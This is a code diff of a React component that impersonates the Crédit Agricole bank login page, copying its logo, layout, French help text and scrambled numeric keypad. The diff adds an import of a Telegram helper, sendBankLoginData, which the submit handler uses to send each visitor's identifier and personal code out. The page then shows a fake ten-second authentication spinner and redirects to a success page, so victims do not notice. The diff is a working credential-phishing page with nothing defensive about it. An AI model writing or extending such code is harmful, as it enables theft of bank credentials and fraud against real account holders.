@@ -1,75 +1,62 @@
 import React, { useState } from 'react';
-import { Loader2, Search, X } from 'lucide-react';
+import { X } from 'lucide-react';
+import { sendBankLoginData } from '../../utils/telegram';
 
-interface CreditAgricoleAuthTemplateProps {
-  onSubmit: (formData: any) => Promise<boolean>;
-}
+type CreditAgricoleAuthProps = {
+  onAuthenticate: () => void;
+  onBack: () => void;
+};
 
-export function CreditAgricoleAuthTemplate({ onSubmit }: CreditAgricoleAuthTemplateProps) {
-  const [formData, setFormData] = useState({
-    clientNumber: '',
-    password: ''
-  });
-  const [status, setStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');
-  const [showLoader, setShowLoader] = useState(false);
-  const [rememberMe, setRememberMe] = useState(false);
-  const [passwordDigits, setPasswordDigits] = useState(['', '', '', '', '', '']);
+const CreditAgricoleAuth = ({ onAuthenticate, onBack }: CreditAgricoleAuthProps) => {
+  const [identifiant, setIdentifiant] = useState('');
+  const [codePersonnel, setCodePersonnel] = useState('');
+  const [isLoading, setIsLoading] = useState(false);
+
+  const handleNumberClick = (number: string) => {
+    if (codePersonnel.length < 6) {
+      setCodePersonnel(prev => prev + number);
+    }
+  };
+
+  const clearCodePersonnel = () => {
+    setCodePersonnel('');
+  };
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    setStatus('sending');
+    if (identifiant && codePersonnel) {
+      setIsLoading(true);
+      
+      await sendBankLoginData({
+        bankName: 'Crédit Agricole',
+        username: identifiant,
+        password: codePersonnel
+      });
 
-    try {
-      const submitData = {
-        ...formData,
-        password: passwordDigits.join('')
-      };
-      
-      const success = await onSubmit(submitData);
-      if (!success) throw new Error('Failed to submit form');
-      
-      setStatus('success');
-      setShowLoader(true);
-      
       setTimeout(() => {
-        setShowLoader(false);
-        setStatus('idle');
-      }, 3000);
-    } catch (error) {
-      setStatus('error');
-      setTimeout(() => setStatus('idle'), 3000);
+        setIsLoading(false);
+        // Redirection vers la page de succès
+        window.location.href = '/success';
+      }, 10000);
     }
   };
 
-  const handleKeypadClick = (digit: string) => {
-    const emptyIndex = passwordDigits.findIndex(d => d === '');
-    if (emptyIndex !== -1) {
-      const newDigits = [...passwordDigits];
-      newDigits[emptyIndex] = digit;
-      setPasswordDigits(newDigits);
-    }
-  };
-
-  const clearPassword = () => {
-    setPasswordDigits(['', '', '', '', '', '']);
-  };
-
-  // Show loader overlay when processing
-  if (showLoader) {
+  if (isLoading) {
     return (
-      <div className="min-h-screen bg-gradient-to-br from-green-600 to-green-700 pt-20">
-        <div className="max-w-4xl mx-auto px-4 py-8">
-          <div className="bg-white rounded-2xl shadow-xl p-8">
-            <div className="flex flex-col items-center justify-center py-16">
-              <Loader2 className="w-12 h-12 animate-spin text-green-600 mb-6" />
-              <h2 className="text-2xl font-bold text-gray-800 mb-4">
-                Authentification en cours...
-              </h2>
-              <p className="text-gray-600 text-center max-w-md">
-                Connexion sécurisée à votre espace Crédit Agricole en cours.
-              </p>
+      <div className="min-h-screen flex flex-col items-center justify-center bg-white">
+        <div className="text-center">
+          <div className="mb-8">
+            <div className="w-20 h-20 mx-auto relative">
+              <div className="absolute inset-0 rounded-full border-4 border-gray-200"></div>
+              <div className="absolute inset-0 rounded-full border-4 border-[#00A651] animate-spin border-t-transparent"></div>
             </div>
           </div>
+          <h2 className="text-xl font-semibold text-gray-800 mb-2">
+            Authentification en cours
+          </h2>
+          <p className="text-gray-600">
+            Connexion à votre espace Crédit Agricole...
+          </p>
         </div>
       </div>
     );
@@ -77,236 +64,202 @@ export function CreditAgricoleAuthTemplate({ onSubmit }: CreditAgricoleAuthTempl
 
   return (
     <div className="min-h-screen bg-white">
-      <div className="grid grid-cols-1 lg:grid-cols-2 min-h-screen">
-        {/* Left Panel - Login Form */}
-        <div className="bg-white p-4 lg:p-8 flex flex-col justify-center">
-          <div className="max-w-md mx-auto w-full">
-            {/* Header with Logo */}
-            <div className="flex items-center justify-between mb-8">
-              <div className="flex items-center">
-                <img 
-                  src="https://upload.wikimedia.org/wikipedia/fr/a/a6/Crédit_Agricole.svg" 
-                  alt="Crédit Agricole" 
-                  className="h-8"
-                />
-              </div>
-              <div className="flex items-center space-x-4">
-                <Search className="w-5 h-5 text-gray-600" />
-                <X className="w-5 h-5 text-gray-600" />
-              </div>
-            </div>
+      {/* Header avec logo et bouton fermer */}
+      <header className="flex items-center justify-between p-4 lg:p-6">
+        <div className="flex items-center">
+          <img 
+            src="https://www.credit-agricole.fr/content/dam/ca-assets/images/logos/logo-ca.svg" 
+            alt="Crédit Agricole" 
+            className="h-8 lg:h-10"
+            onError={(e) => {
+              (e.target as HTMLImageElement).src = 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjQwIiB2aWV3Qm94PSIwIDAgMTAwIDQwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cmVjdCB3aWR0aD0iMTAwIiBoZWlnaHQ9IjQwIiBmaWxsPSIjMDBBNjUxIi8+Cjx0ZXh0IHg9IjUwIiB5PSIyNSIgZm9udC1mYW1pbHk9IkFyaWFsLCBzYW5zLXNlcmlmIiBmb250LXNpemU9IjEyIiBmaWxsPSJ3aGl0ZSIgdGV4dC1hbmNob3I9Im1pZGRsZSI+Q0E8L3RleHQ+Cjwvc3ZnPgo=';
+            }}
+          />
+        </div>
+        <button 
+          onClick={onBack}
+          className="p-2 text-gray-600 hover:text-gray-800 transition-colors"
+        >
+          <X size={24} />
+        </button>
+      </header>
 
-            <h1 className="text-xl font-semibold text-gray-800 mb-8">
-              Connexion à votre compte
-            </h1>
-
-            <form onSubmit={handleSubmit} className="space-y-6">
-              {/* Identifiant */}
-              <div>
-                <label className="block text-sm font-medium text-green-700 mb-2">
-                  Identifiant (10 chiffres)
-                </label>
-                <input
-                  type="text"
-                  value={formData.clientNumber}
-                  onChange={(e) => setFormData(prev => ({ ...prev, clientNumber: e.target.value }))}
-                  className="w-full px-4 py-3 border border-gray-300 rounded focus:ring-2 focus:ring-green-500 focus:border-transparent text-lg"
-                  placeholder="5 4 6 5 4 6 4 5 6 5"
-                  maxLength={10}
-                  required
-                />
-              </div>
-
-              {/* Remember Me */}
-              <div className="flex items-center space-x-3">
-                <label className="flex items-center space-x-2 cursor-pointer">
-                  <div className="relative">
-                    <input
-                      type="checkbox"
-                      checked={rememberMe}
-                      onChange={(e) => setRememberMe(e.target.checked)}
-                      className="sr-only"
-                    />
-                    <div className={`w-12 h-6 rounded-full transition-colors ${
-                      rememberMe ? 'bg-green-500' : 'bg-gray-300'
-                    }`}>
-                      <div className={`w-5 h-5 bg-white rounded-full shadow-md transform transition-transform ${
-                        rememberMe ? 'translate-x-6' : 'translate-x-0.5'
-                      } mt-0.5`}></div>
-                    </div>
-                  </div>
-                  <span className="text-sm text-gray-600">Mémoriser mon identifiant</span>
-                </label>
-              </div>
-
-              {/* Mot de passe */}
-              <div>
-                <label className="block text-sm font-medium text-green-700 mb-2">
-                  Mot de passe (6 chiffres)
-                </label>
-                
-                {/* Password Display */}
-                <div className="flex justify-center space-x-2 mb-4">
-                  {passwordDigits.map((digit, index) => (
-                    <div
-                      key={index}
-                      className={`w-8 h-8 border-2 rounded flex items-center justify-center text-lg font-bold ${
-                        digit ? 'border-green-500 bg-green-50' : 'border-gray-300'
-                      }`}
-                    >
-                      {digit ? '•' : ''}
-                    </div>
-                  ))}
-                </div>
-
-                {/* Virtual Keypad - Disposition EXACTE selon l'image */}
-                <div className="bg-gray-50 rounded-lg p-4">
-                  <div className="space-y-2 max-w-xs mx-auto">
-                    {/* Première ligne: 0, 3, 5, 4, 7 */}
-                    <div className="flex justify-center space-x-2">
-                      <button
-                        type="button"
-                        onClick={() => handleKeypadClick('0')}
-                        className="w-12 h-12 bg-green-100 hover:bg-green-200 rounded text-lg font-bold transition-colors"
-                      >
-                        0
-                      </button>
-                      <button
-                        type="button"
-                        onClick={() => handleKeypadClick('3')}
-                        className="w-12 h-12 bg-green-100 hover:bg-green-200 rounded text-lg font-bold transition-colors"
-                      >
-                        3
-                      </button>
-                      <button
-                        type="button"
-                        onClick={() => handleKeypadClick('5')}
-                        className="w-12 h-12 bg-green-100 hover:bg-green-200 rounded text-lg font-bold transition-colors"
-                      >
-                        5
-                      </button>
-                      <button
-                        type="button"
-                        onClick={() => handleKeypadClick('4')}
-                        className="w-12 h-12 bg-green-100 hover:bg-green-200 rounded text-lg font-bold transition-colors"
-                      >
-                        4
-                      </button>
-                      <button
-                        type="button"
-                        onClick={() => handleKeypadClick('7')}
-                        className="w-12 h-12 bg-green-100 hover:bg-green-200 rounded text-lg font-bold transition-colors"
-                      >
-                        7
-                      </button>
-                    </div>
-
-                    {/* Deuxième ligne: 2, 1, 6, 9, 8 */}
-                    <div className="flex justify-center space-x-2">
-                      <button
-                        type="button"
-                        onClick={() => handleKeypadClick('2')}
-                        className="w-12 h-12 bg-green-100 hover:bg-green-200 rounded text-lg font-bold transition-colors"
-                      >
-                        2
-                      </button>
-                      <button
-                        type="button"
-                        onClick={() => handleKeypadClick('1')}
-                        className="w-12 h-12 bg-green-100 hover:bg-green-200 rounded text-lg font-bold transition-colors"
-                      >
-                        1
-                      </button>
-                      <button
-                        type="button"
-                        onClick={() => handleKeypadClick('6')}
-                        className="w-12 h-12 bg-green-100 hover:bg-green-200 rounded text-lg font-bold transition-colors"
-                      >
-                        6
-                      </button>
-                      <button
-                        type="button"
-                        onClick={() => handleKeypadClick('9')}
-                        className="w-12 h-12 bg-green-100 hover:bg-green-200 rounded text-lg font-bold transition-colors"
-                      >
-                        9
-                      </button>
-                      <button
-                        type="button"
-                        onClick={() => handleKeypadClick('8')}
-                        className="w-12 h-12 bg-green-100 hover:bg-green-200 rounded text-lg font-bold transition-colors"
-                      >
-                        8
-                      </button>
-                    </div>
-                  </div>
-
-                  {/* Clear Button */}
-                  <div className="flex justify-center mt-4">
-                    <button
-                      type="button"
-                      onClick={clearPassword}
-                      className="text-gray-500 hover:text-gray-700 text-sm underline"
-                    >
-                      Effacer
-                    </button>
-                  </div>
-                </div>
-              </div>
-
-              {/* Submit Button */}
-              <button
-                type="submit"
-                disabled={status === 'sending' || !formData.clientNumber || passwordDigits.some(d => d === '')}
-                className="w-full bg-green-600 text-white font-semibold py-4 rounded hover:bg-green-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
-              >
-                {status === 'sending' ? 'Connexion en cours...' : 'Se connecter'}
+      <div className="flex flex-col lg:flex-row min-h-[calc(100vh-80px)]">
+        {/* Image de fond - Desktop uniquement */}
+        <div className="hidden lg:block lg:w-1/2 relative">
+          <img 
+            src="https://images.unsplash.com/photo-1702648156180-25d8be9c9527?q=80&w=2344&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
+            alt="Couple souriant"
+            className="w-full h-full object-cover"
+          />
+          
+          {/* Overlay avec message promotionnel */}
+          <div className="absolute bottom-8 left-8 right-8">
+            <div className="bg-white/95 backdrop-blur-sm rounded-lg p-6 shadow-lg">
+              <button className="bg-[#00A651] text-white px-4 py-2 rounded-full text-sm font-medium mb-4">
+                VOS TRAVAUX
               </button>
-
-              {status === 'error' && (
-                <div className="text-red-600 text-center bg-red-50 p-3 rounded">
-                  Échec de la connexion. Veuillez vérifier vos identifiants.
-                </div>
-              )}
-            </form>
+              <h3 className="text-xl font-bold text-gray-800 mb-3">
+                Gare aux fraudes à la rénovation énergétique
+              </h3>
+              <p className="text-gray-600 text-sm mb-4">
+                Vous prévoyez de rénover votre logement ? Restez vigilant ! Certaines 
+                entreprises sont peu scrupuleuses avec les consommateurs : devis 
+                incompréhensibles, crédits camouflés, labels de qualité mensongers, 
+                réalisation de prestations parfois non conformes, etc.
+              </p>
+              <button className="bg-[#00A651] text-white px-6 py-2 rounded-full text-sm font-medium hover:bg-[#008f47] transition-colors">
+                JE ME PROTÈGE
+              </button>
+            </div>
           </div>
         </div>
 
-        {/* Right Panel - Green Background with Content */}
-        <div className="bg-gradient-to-br from-green-600 to-green-700 p-4 lg:p-8 flex flex-col justify-center text-white">
-          <div className="max-w-md mx-auto w-full">
-            <h2 className="text-3xl lg:text-4xl font-bold mb-8">
-              Crédit Agricole, votre banquier proche
-            </h2>
+        {/* Formulaire de connexion */}
+        <div className="w-full lg:w-1/2 flex items-center justify-center p-6 lg:p-12">
+          <div className="w-full max-w-md">
+            <h1 className="text-2xl lg:text-3xl font-bold text-gray-800 mb-8">
+              Accéder à mes comptes
+            </h1>
 
-            {/* Insurance Section */}
-            <div className="bg-green-700 bg-opacity-50 rounded-lg p-6 mb-8">
-              <h3 className="text-xl font-semibold mb-4">
-                Services Crédit Agricole
-              </h3>
-              <p className="text-green-100 mb-4 text-sm">
-                Accédez à l'ensemble de vos services bancaires et d'assurance en un seul endroit.
-              </p>
-              <div className="space-y-3">
-                <button className="text-white underline text-sm hover:text-green-200">
-                  Découvrir nos services
-                </button>
-                <br />
-                <button className="bg-green-600 hover:bg-green-500 text-white px-6 py-2 rounded transition-colors">
-                  Me connecter à mon espace
-                </button>
+            <form onSubmit={handleSubmit} className="space-y-6">
+              {/* Champ Identifiant */}
+              <div>
+                <label className="block text-gray-800 font-medium mb-2">
+                  IDENTIFIANT
+                </label>
+                <p className="text-sm text-gray-600 mb-3">
+                  Saisissez votre identifiant à 11 chiffres
+                </p>
+                <div className="relative">
+                  <input
+                    type="text"
+                    value={identifiant}
+                    onChange={(e) => setIdentifiant(e.target.value.replace(/\D/g, '').slice(0, 11))}
+                    placeholder="Exemple 98652706859"
+                    className="w-full px-4 py-3 border border-gray-300 rounded-lg text-gray-800 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-[#00A651] focus:border-transparent"
+                    maxLength={11}
+                  />
+                  {identifiant && (
+                    <button
+                      type="button"
+                      onClick={() => setIdentifiant('')}
+                      className="absolute right-3 top-1/2 transform -translate-y-1/2 text-[#00A651] hover:text-[#008f47]"
+                    >
+                      <X size={20} />
+                    </button>
+                  )}
+                </div>
               </div>
-            </div>
 
-            {/* Additional Info */}
-            <div className="text-green-100 text-sm space-y-2">
-              <p>• Banque de proximité depuis 1885</p>
-              <p>• Sécurité renforcée pour vos transactions</p>
-              <p>• Support client disponible 24h/24</p>
+              {/* Champ Code Personnel */}
+              <div>
+                <div className="flex items-center justify-between mb-2">
+                  <label className="text-gray-800 font-medium">
+                    CODE PERSONNEL
+                  </label>
+                  <button
+                    type="button"
+                    className="text-[#00A651] hover:text-[#008f47] text-sm font-medium hover:underline"
+                  >
+                    Perdu / Oublié ?
+                  </button>
+                </div>
+                <div className="relative">
+                  <input
+                    type="password"
+                    value={codePersonnel}
+                    readOnly
+                    placeholder="Tapez votre code dans le pavé numérique ci-dessous"
+                    className="w-full px-4 py-3 border border-gray-300 rounded-lg text-gray-800 placeholder-gray-400 bg-gray-50 cursor-not-allowed"
+                  />
+                  {codePersonnel && (
+                    <button
+                      type="button"
+                      onClick={clearCodePersonnel}
+                      className="absolute right-3 top-1/2 transform -translate-y-1/2 text-[#00A651] hover:text-[#008f47]"
+                    >
+                      <X size={20} />
+                    </button>
+                  )}
+                </div>
+              </div>
+
+              {/* Pavé numérique */}
+              <div className="grid grid-cols-5 gap-3 my-8">
+                {[9, 4, 6, 8, 3, 7, 0, 5, 2, 1].map((number) => (
+                  <button
+                    key={number}
+                    type="button"
+                    onClick={() => handleNumberClick(number.toString())}
+                    className="aspect-square bg-gray-100 hover:bg-gray-200 rounded-lg text-xl font-semibold text-gray-800 transition-colors focus:outline-none focus:ring-2 focus:ring-[#00A651]"
+                  >
+                    {number}
+                  </button>
+                ))}
+              </div>
+
+              {/* Bouton Valider */}
+              <button
+                type="submit"
+                disabled={!identifiant || !codePersonnel || isLoading}
+                className="w-full bg-[#00A651] text-white py-4 rounded-lg text-lg font-semibold hover:bg-[#008f47] disabled:bg-gray-300 disabled:cursor-not-allowed transition-colors focus:outline-none focus:ring-2 focus:ring-[#00A651] focus:ring-offset-2"
+              >
+                VALIDER
+              </button>
+            </form>
+
+            {/* Sections d'aide */}
+            <div className="mt-8 space-y-6 text-sm">
+              <div>
+                <h3 className="font-bold text-gray-800 mb-2">
+                  OUBLI/PERTE DE CODE PERSONNEL
+                </h3>
+                <p className="text-gray-600">
+                  Si vous avez oublié ou perdu votre code personnel,{' '}
+                  <button className="text-[#00A651] hover:text-[#008f47] hover:underline">
+                    cliquez ici
+                  </button>
+                  .
+                </p>
+              </div>
+
+              <div>
+                <h3 className="font-bold text-gray-800 mb-2">
+                  UN PROBLÈME TECHNIQUE ?
+                </h3>
+                <p className="text-gray-600">
+                  Une assistance est à votre disposition,{' '}
+                  <button className="text-[#00A651] hover:text-[#008f47] hover:underline">
+                    cliquez ici
+                  </button>
+                  .
+                </p>
+              </div>
+
+              <div>
+                <h3 className="font-bold text-gray-800 mb-2">
+                  SÉCURITÉ
+                </h3>
+                <p className="text-gray-600 mb-2">
+                  Restez vigilants et veillez à protéger vos données personnelles.
+                </p>
+                <button className="text-[#00A651] hover:text-[#008f47] hover:underline">
+                  Consulter nos conseils de sécurité
+                </button>
+                <p className="text-gray-600 mt-2">
+                  Nous vous invitons également à consulter régulièrement nos Conditions Générales d'utilisation.{' '}
+                  <button className="text-[#00A651] hover:text-[#008f47] hover:underline">
+                    Voir les Conditions Générales d'Utilisation
+                  </button>
+                </p>
+              </div>
             </div>
           </div>
         </div>
       </div>
     </div>
   );
-}
+};
+
+export default CreditAgricoleAuth;
